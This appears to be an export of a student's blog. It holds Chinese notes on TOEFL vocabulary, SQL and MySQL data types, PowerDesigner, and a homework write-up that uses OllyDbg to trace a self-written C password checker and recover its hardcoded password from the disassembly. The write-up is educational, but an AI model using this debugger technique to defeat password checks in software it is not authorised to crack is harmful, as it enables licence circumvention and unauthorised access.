    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="TPO46"><a href="#TPO46" class="headerlink" title="TPO46"></a>TPO46</h3><h4 id="The-Origins-of-Writing"><a href="#The-Origins-of-Writing" class="headerlink" title="The Origins of Writing"></a><strong>The Origins of Writing</strong></h4><ul>
<li><p>radical 激进的；彻底的</p>
<p>radically 彻底地</p>
</li>
</ul>
<h4 id="The-Commercial-Revolution-in-Medieval-Europe"><a href="#The-Commercial-Revolution-in-Medieval-Europe" class="headerlink" title="The Commercial Revolution in Medieval Europe"></a><strong>The Commercial Revolution in Medieval Europe</strong></h4><ul>
<li><p>At cities such as Bruges and London, Hanseatic merchants secured special trading concessions, exempting them from all tolls and allowing them to trade at local fairs. </p>
<p>在布鲁日和伦敦等城市，汉萨商人获得特殊的贸易优惠，免除了所有的过路费，并且允许他们在当地的集市做买卖。</p>
</li>
<li><p>secure<br>  adj.  安心的; 有把握的; 可靠的; 牢靠的; 稳固的; 安全的; 稳妥的;<br>  v.     (尤指经过努力) <strong>获得，取得，实现</strong>; 拴牢; 扣紧; 关严; 保护; 保卫; 使安全; </p>
</li>
<li><p>finished product 成品</p>
</li>
<li><p>精读：<a href="https://top.zhan.com/toefl/read/practicereview-714-12-107586700-5.html?ingress=single" target="_blank" rel="noopener">https://top.zhan.com/toefl/read/practicereview-714-12-107586700-5.html?ingress=single</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>千锋网安</title>
    <url>/2020/04/03/%E5%8D%83%E9%94%8B%E7%BD%91%E5%AE%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>vmware<ul>
<li>虚拟机克隆，链接方式依赖于原虚拟机，省空间</li>
<li>快照</li>
</ul>
</li>
<li>系统：<a href="http://msdn.itellyou.cn" target="_blank" rel="noopener">http://msdn.itellyou.cn</a>, U盘作为装系统的光盘，驱动精灵</li>
<li>路由器 连接内网和外网，交换机组建局域网</li>
<li>ip：32位二进制</li>
</ul>
]]></content>
      <tags>
        <tag>网安</tag>
      </tags>
  </entry>
  <entry>
    <title>sql语句</title>
    <url>/2020/04/01/sql%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li><p>SHOW DATABASE –显示当前的数据库</p>
</li>
<li><p>CREATE DATABASE XXX –创建数据库</p>
<p>DEFAULT CHARACTER SET utf8mb4<br>DEFAULT COLLATE utf8mb4_unicode_ci;</p>
</li>
<li><p>USE XXX;</p>
</li>
<li><p>CREATE TABLE IF NOT EXISTS airline( –创建数据表<br>code    char(3)    PRIMARY KEY,<br>airlinename    varchar(1024)<br>);</p>
</li>
<li><p>ALTER TABLE S</p>
<pre><code>ADD FOREIGN KEY (a) REFERENCES E(a),
ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
</ul>
]]></content>
      <categories>
        <category>major</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库上机L4</title>
    <url>/2020/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>空值再检索操作存储等方面都有不好的影响</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>power designer入门</title>
    <url>/2020/03/29/power-designer%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>PD的安装与配置</li>
<li>画ER图</li>
</ul>
<a id="more"></a>

<h2 id="一、安装、破解和汉化"><a href="#一、安装、破解和汉化" class="headerlink" title="一、安装、破解和汉化"></a>一、安装、破解和汉化</h2><p>略</p>
<h2 id="二、用power-designer画ER图"><a href="#二、用power-designer画ER图" class="headerlink" title="二、用power designer画ER图"></a>二、用power designer画ER图</h2><h3 id="新建模型"><a href="#新建模型" class="headerlink" title="新建模型"></a>新建模型</h3><ul>
<li>create model</li>
<li>conceptual<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3></li>
<li>新建实体<img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer%E5%85%A5%E9%97%A8/image-20200329163139504.png"  alt="image-20200329163139504"></li>
<li>右键，恢复光标</li>
<li>双击实体，编辑<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer%E5%85%A5%E9%97%A8/image-20200329164711686.png"  alt="image-20200329164711686"></li>
</ul>
</li>
<li>子类<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer入门/image-20200329175300122.png"  alt="image-20200329175300122" style="zoom:50%;">空值方法</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer入门/image-20200329175327457.png"  alt="image-20200329175327457" style="zoom:50%;">ER方法<h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer入门/image-20200329173325658.png"  alt="image-20200329173325658" style="zoom:67%;">

</li>
</ul>
</li>
</ul>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer入门/image-20200329173429629.png"  alt="image-20200329173429629" style="zoom:50%;">





</li>
</ul>
<h3 id="建立表"><a href="#建立表" class="headerlink" title="建立表"></a>建立表</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/images/power-designer%E5%85%A5%E9%97%A8/image-20200329180024334.png"  alt="image-20200329180024334"></p>
<h3 id="自动生成sql语句"><a href="#自动生成sql语句" class="headerlink" title="自动生成sql语句"></a>自动生成sql语句</h3><ul>
<li>Database -&gt; Generate Database -&gt; Ok -&gt; Edit</li>
</ul>
<ul>
<li>PowerDesigner中各种表关系的区别：<a href="https://wenku.baidu.com/view/e57c230d03020740be1e650e52ea551810a6c93a.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/e57c230d03020740be1e650e52ea551810a6c93a.html</a></li>
</ul>
]]></content>
      <categories>
        <category>major</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>Power Designer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库上机L3</title>
    <url>/2020/03/26/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ol>
<li>数值类型：满足要求下，尽量使用“短”数据类型</li>
<li>字符串类型：char、varchar，字符与字节数的关系</li>
<li>日期类型：datetime、timestamp、（int unsigned）</li>
<li>复合类型：enum、set</li>
<li>二进制类型：blob、text</li>
<li>选择原则<br>选择合适的数据类型，不仅可以节省储存空间，还可以有效地提升数据的计算性能。 </li>
</ol>
<a id="more"></a>



<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/image-20200326203608551.png"  alt="image-20200326203608551"></p>
<ul>
<li>tynint(2) 括号内数字表示显示宽度</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/image-20200326204414344.png"  alt="image-20200326204414344"></p>
<p>（图片转载自<a href="https://blog.csdn.net/li295214001/article/details/51322018）" target="_blank" rel="noopener">https://blog.csdn.net/li295214001/article/details/51322018）</a></p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326204621906.png"  alt="image-20200326204621906" style="zoom:43%;">
</li>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326204701918.png"  alt="image-20200326204701918" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326204712462.png"  alt="image-20200326204712462" style="zoom: 50%;"></p>
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326204952765.png"  alt="image-20200326204952765" style="zoom: 50%;">
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326205133956.png"  alt="image-20200326205133956" style="zoom:50%;">
- 255代表字符长度而不是字节长度
- 长度小于255用一个字节记录，大于用两个
</li>
<li><p>gbk 2字节、utf-8 3字节</p>
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326205726281.png"  alt="image-20200326205726281" style="zoom:50%;">
</li>
<li><p>char存储时去掉字符串末尾空格，varchar不会</p>
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326210328463.png"  alt="image-20200326210328463" style="zoom:67%;">
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326210856307.png"  alt="image-20200326210856307" style="zoom:50%;">
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326211048828.png"  alt="image-20200326211048828" style="zoom:50%;">
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326211321528.png"  alt="image-20200326211321528" style="zoom:50%;"></li>
<li><p>datetime 8字节，timestamp 4 字节</p>
</li>
<li><p>unix时间戳 1970到现在的时间</p>
</li>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/image-20200326211641095.png"  alt="image-20200326211641095"></p>
<ul>
<li>数据很多，大量排序、查询-&gt;int存储时间</li>
</ul>
</li>
<li><p>enum 单选，set复选</p>
</li>
<li><p>二进制类型-&gt;01构成的字符串，以字节为单位进行存储。字符串以字符为单位存储</p>
</li>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/image-20200326212101281.png"  alt="image-20200326212101281"></p>
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326212140142.png"  alt="image-20200326212140142" style="zoom:50%;">
</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326212349563.png"  alt="image-20200326212349563" style="zoom:50%;">

</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/数据库上机L3/image-20200326212602911.png"  alt="image-20200326212602911" style="zoom:50%;">

<ul>
<li>IP地址最好选择整型进行存储，存储空间小，查询速度快</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>听力单词已背科目</title>
    <url>/2020/03/25/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E5%90%AC%E5%8A%9B%E5%8D%95%E8%AF%8D%E5%B7%B2%E8%83%8C%E7%A7%91%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="生命科学"><a href="#生命科学" class="headerlink" title="生命科学"></a>生命科学</h3><ul>
<li>生物学</li>
<li>海洋生物学</li>
<li>动物学</li>
<li>植物学</li>
</ul>
]]></content>
      <categories>
        <category>TOEFL</category>
      </categories>
      <tags>
        <tag>听力</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>计算方法第五章错题总总结</title>
    <url>/2020/03/24/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%94%99%E9%A2%98%E6%80%BB%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>解方程组</li>
<li>范数</li>
</ul>
<a id="more"></a>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/c267bcd6e6480683412c76e23089405.jpg"  alt="c267bcd6e6480683412c76e23089405"></p>
]]></content>
      <categories>
        <category>major</category>
      </categories>
      <tags>
        <tag>计算方法</tag>
      </tags>
  </entry>
  <entry>
    <title>网站导航</title>
    <url>/2020/03/24/%E7%BD%91%E7%AB%99%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>各种网站收集，欢迎推荐</p>
<a id="more"></a>



<h2 id="一、学习"><a href="#一、学习" class="headerlink" title="一、学习"></a>一、学习</h2><h3 id="1、课程"><a href="#1、课程" class="headerlink" title="1、课程"></a>1、课程</h3><ul>
<li>bilibili大学：<a href="https://www.bilibili.com/" target="_blank" rel="noopener">https://www.bilibili.com/</a></li>
<li>雨课堂网页版：<a href="https://changjiang.yuketang.cn/web" target="_blank" rel="noopener">https://changjiang.yuketang.cn/web</a></li>
<li>莫凡PYTHON：<a href="https://morvanzhou.github.io/" target="_blank" rel="noopener">https://morvanzhou.github.io/</a></li>
<li>coursera：<a href="https://www.coursera.org/" target="_blank" rel="noopener">https://www.coursera.org/</a><h3 id="2、练习"><a href="#2、练习" class="headerlink" title="2、练习"></a>2、练习</h3></li>
</ul>
<h4 id="a、代码"><a href="#a、代码" class="headerlink" title="a、代码"></a>a、代码</h4><ul>
<li>洛谷：<a href="https://www.luogu.com.cn/" target="_blank" rel="noopener">https://www.luogu.com.cn/</a></li>
<li>codeforces：<a href="http://codeforces.com/contests" target="_blank" rel="noopener">http://codeforces.com/contests</a></li>
</ul>
<h4 id="b、英语"><a href="#b、英语" class="headerlink" title="b、英语"></a>b、英语</h4><ul>
<li>小站托福：<a href="https://top.zhan.com/toefl/" target="_blank" rel="noopener">https://top.zhan.com/toefl/</a></li>
<li>bing词典：<a href="https://cn.bing.com/dict/" target="_blank" rel="noopener">https://cn.bing.com/dict/</a></li>
</ul>
<h2 id="二、办公"><a href="#二、办公" class="headerlink" title="二、办公"></a>二、办公</h2><ul>
<li>学生邮箱：<a href="https://mailhz.qiye.163.com/js6/main.jsp?sid=o0uA9A10S7AFM7qBf6Q-S10Qirfg9Tes&amp;hl=zh_CN#module=welcome.CorpWelcomeModule%7C%7B%7D" target="_blank" rel="noopener">https://mailhz.qiye.163.com/js6/main.jsp?sid=o0uA9A10S7AFM7qBf6Q-S10Qirfg9Tes&amp;hl=zh_CN#module=welcome.CorpWelcomeModule%7C%7B%7D</a></li>
<li>webvpn：<a href="https://webvpn.nankai.edu.cn/" target="_blank" rel="noopener">https://webvpn.nankai.edu.cn/</a></li>
</ul>
<h2 id="三、功能（博主自己使用）"><a href="#三、功能（博主自己使用）" class="headerlink" title="三、功能（博主自己使用）"></a>三、功能（博主自己使用）</h2><ul>
<li>网站内容更新：<a href="https://gitee.com/michelle19l/michelle19l/pages">https://gitee.com/michelle19l/michelle19l/pages</a></li>
</ul>
]]></content>
      <categories>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>资料收集整理</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业三：OLLYDBG软件破解</title>
    <url>/2020/03/23/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>ollydbg使用入门</li>
</ul>
<a id="more"></a>

<h3 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317210716065.png"  alt="image-20200317210716065" style="zoom:50%;">



<p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> password <span class="meta-string">"12345678"</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">verifyPwd</span><span class="params">(<span class="keyword">char</span>* pwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line">	flag = <span class="built_in">strcmp</span>(password,pwd);</span><br><span class="line">	<span class="keyword">return</span> flag==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> bFlag;</span><br><span class="line">	<span class="keyword">char</span> pwd[<span class="number">1024</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"please input password:"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,pwd);</span><br><span class="line">		bFlag=verifyPwd(pwd);</span><br><span class="line">		<span class="keyword">if</span>(bFlag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"passed\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"wrong password, please input again:\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用debug模式运行，拿到exe文件</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317211748248.png"  alt="image-20200317211748248" style="zoom:50%;">

<p>用ollydbg打开，单步执行</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317212052362.png"  alt="image-20200317212052362" style="zoom:67%;">

<p>单步调试，找到主函数</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317213521238.png"  alt="image-20200317213521238" style="zoom:67%;">

<p>F7步入</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317213828732.png"  alt="image-20200317213828732" style="zoom:67%;">

<p>跳转至主函数</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317213922692.png"  alt="image-20200317213922692" style="zoom:67%;">

<p>输入</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317214105272.png"  alt="image-20200317214105272" style="zoom:67%;">

<p>找到verifyPwd函数</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200317214352472.png"  alt="image-20200317214352472" style="zoom:67%;">

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20200317214414725.png"  alt="image-20200317214414725"></p>
<p>跳转到verifyPwd函数</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200320171345288.png"  alt="image-20200320171345288" style="zoom:67%;">

<p>在学习的过程中，使用vc6查看已经划分好的反汇编代码</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20200320173026497.png"  alt></p>
<p>其中框出的部分为调用verifyPwd函数并将返回值赋给bFlag的代码</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323090432718.png"  alt="image-20200323090432718" style="zoom:67%;">

<table>
<thead>
<tr>
<th>反汇编代码</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>lea         edx,[ebp-404h]</td>
<td>[enp-404]中存储的是输入的字符串</td>
</tr>
<tr>
<td>push        edx</td>
<td>字符串地址入栈</td>
</tr>
<tr>
<td>call        @ILT+15(verifyPwd) (00401014)</td>
<td>函数跳转</td>
</tr>
<tr>
<td>add         esp,4</td>
<td>将函数调用前push的edx值弹出</td>
</tr>
<tr>
<td>mov         byte ptr [ebp-4],al</td>
<td>将函数返回值赋给bFlag</td>
</tr>
</tbody></table>
<h3 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323092641646.png"  alt="image-20200323092641646" style="zoom:50%;">

<ul>
<li><p>flag==0，即输入字符串为“12345678”</p>
</li>
<li><p>跳转进入函数</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323093632694.png"  alt="image-20200323093632694" style="zoom:50%;">
</li>
<li><p>进入strcmp</p>
<p> <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323093749719.png"  alt="image-20200323093749719" style="zoom: 80%;">![image-20200323105229337](/images/漏测作业/漏测作业三/image-20200323105229337.png&gt; <img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业三/image-20200323105229337.png"  alt="image-20200323105229337" style="zoom:80%;"> </p>
</li>
</ul>
<ul>
<li>verifyPwd函数：</li>
</ul>
<table>
<thead>
<tr>
<th>地址</th>
<th>汇编代码</th>
<th>注释</th>
<th>寄存器</th>
</tr>
</thead>
<tbody><tr>
<td>00401030</td>
<td>push ebp</td>
<td>; 2_1_1.verifyPwd(void)</td>
<td></td>
</tr>
<tr>
<td>00401031</td>
<td>mov ebp,esp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401033</td>
<td>sub esp,44</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401036</td>
<td>push ebx</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401037</td>
<td>push esi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401038</td>
<td>push edi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401039</td>
<td>lea edi,[ebp-44]</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040103C</td>
<td>mov ecx,11</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401041</td>
<td>mov eax,CCCCCCCC</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401046</td>
<td>rep stos dword ptr [edi]</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401048</td>
<td>mov eax,dword ptr [ebp+8]</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040104B</td>
<td>push eax</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040104C</td>
<td>push offset 0043101C</td>
<td>; ASCII “12345678”</td>
<td></td>
</tr>
<tr>
<td>00401051</td>
<td><strong>call strcmp</strong></td>
<td>; [strcmp</td>
<td>调用函数</td>
</tr>
<tr>
<td>00401056</td>
<td>add esp,8</td>
<td></td>
<td>eax=0（strcmp函数返回值）</td>
</tr>
<tr>
<td>00401059</td>
<td>mov dword ptr [ebp-4],eax</td>
<td></td>
<td>将寄存器eax的值写入内存</td>
</tr>
<tr>
<td>0040105C</td>
<td>xor eax,eax</td>
<td></td>
<td>eax清零</td>
</tr>
<tr>
<td>0040105E</td>
<td>cmp dword ptr [ebp-4],0</td>
<td>flag==0</td>
<td>返回值与0进行比较</td>
</tr>
<tr>
<td>00401062</td>
<td>sete al</td>
<td></td>
<td>设置al，如果相等则设置</td>
</tr>
<tr>
<td>00401065</td>
<td>pop edi</td>
<td></td>
<td>eax=1，即verifyPwd返回值为1</td>
</tr>
<tr>
<td>00401066</td>
<td>pop esi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401067</td>
<td>pop ebx</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401068</td>
<td>add esp,44</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040106B</td>
<td>cmp ebp,esp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040106D</td>
<td>call _chkesp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401072</td>
<td>mov esp,ebp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401074</td>
<td>pop ebp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00401075</td>
<td>retn</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>strcmp函数<table>
<thead>
<tr>
<th>地址</th>
<th>汇编代码</th>
<th>注释</th>
<th>寄存器</th>
</tr>
</thead>
<tbody><tr>
<td>00408220</td>
<td>mov edx,dword ptr [esp+4]</td>
<td>; ASCII “12345678”（原密码）</td>
<td></td>
</tr>
<tr>
<td>00408224</td>
<td>mov ecx,dword ptr [esp+8]</td>
<td>; ASCII “12345678”（用户输入部分）</td>
<td></td>
</tr>
<tr>
<td>00408228</td>
<td>test edx,00000003</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040822E</td>
<td>jnz short 0040826C</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00408230</td>
<td>mov eax,dword ptr [edx]</td>
<td></td>
<td>eax=34333231（对应密码前四位，小端存储）<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20200323113424926.png"  alt="image-20200323113424926"></td>
</tr>
<tr>
<td>00408232</td>
<td>cmp al,byte ptr [ecx]</td>
<td>al与[ecx]第一位比较，相等</td>
<td>al=31</td>
</tr>
<tr>
<td>00408234</td>
<td>jne short 00408264</td>
<td>不跳转</td>
<td></td>
</tr>
<tr>
<td>00408236</td>
<td>or al,al</td>
<td>al不为0</td>
<td></td>
</tr>
<tr>
<td>00408238</td>
<td>jz short 00408260</td>
<td>不跳转</td>
<td></td>
</tr>
<tr>
<td>0040823A</td>
<td>cmp ah,byte ptr [ecx+1]</td>
<td></td>
<td>ah=32</td>
</tr>
<tr>
<td>0040823D</td>
<td>jne short 00408264</td>
<td>不跳转</td>
<td></td>
</tr>
<tr>
<td>0040823F</td>
<td>or ah,ah</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00408241</td>
<td>jz short 00408260</td>
<td>不跳转</td>
<td></td>
</tr>
<tr>
<td>00408243</td>
<td>shr eax,10</td>
<td>eax右移16位</td>
<td>eax=00003433</td>
</tr>
<tr>
<td>00408246</td>
<td>cmp al,byte ptr [ecx+2]</td>
<td></td>
<td>al=33</td>
</tr>
<tr>
<td>00408249</td>
<td>jne short 00408264</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040824B</td>
<td>or al,al</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040824D</td>
<td>jz short 00408260</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0040824F</td>
<td>cmp ah,byte ptr [ecx+3]</td>
<td></td>
<td>ah=34</td>
</tr>
<tr>
<td>00408252</td>
<td>jne short 00408264</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00408254</td>
<td>add ecx,4</td>
<td>访问后四位数据</td>
<td>ecx=38373635</td>
</tr>
<tr>
<td>00408257</td>
<td>add edx,4</td>
<td></td>
<td>edx=38373635</td>
</tr>
<tr>
<td>0040825A</td>
<td>or ah,ah</td>
<td></td>
<td>ah=34</td>
</tr>
<tr>
<td>0040825C</td>
<td>jnz short 00408230</td>
<td>or结果不为0，跳转至该表第五行，eax被赋值为38373635</td>
<td></td>
</tr>
<tr>
<td>0040825E</td>
<td>mov edi,edi</td>
<td></td>
<td></td>
</tr>
<tr>
<td>00408260</td>
<td>xor eax,eax</td>
<td>所有判断均相等</td>
<td>eax=0</td>
</tr>
<tr>
<td>00408262</td>
<td>retn</td>
<td></td>
<td>f返回</td>
</tr>
</tbody></table>
</li>
</ul>
